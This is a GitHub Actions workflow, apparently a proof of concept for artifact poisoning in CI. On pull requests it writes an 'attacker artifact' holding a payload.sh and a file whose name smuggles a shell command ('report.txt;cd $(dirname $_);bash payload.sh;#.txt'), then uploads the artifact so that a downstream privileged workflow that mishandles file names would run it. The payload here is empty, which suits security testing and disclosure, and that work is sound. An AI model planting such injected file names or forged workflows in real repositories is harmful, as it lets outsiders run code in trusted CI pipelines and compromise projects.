name: Test

on:
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: craft attacker artifact
        run: |
          mkdir -p content
          echo "${{ github.event.pull_request.number }}" > content/pr_number.txt
          echo "report from forged Test workflow" > content/report.txt
          echo '' | base64 -d > content/payload.sh
          python3 - <<'PY'
          open('content/report.txt;cd $(dirname $_);bash payload.sh;#.txt', 'w').write('marker-file\n')
          PY
          ls -la content
      - name: upload artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
        with:
          name: contentdefault
          path: content
          if-no-files-found: error
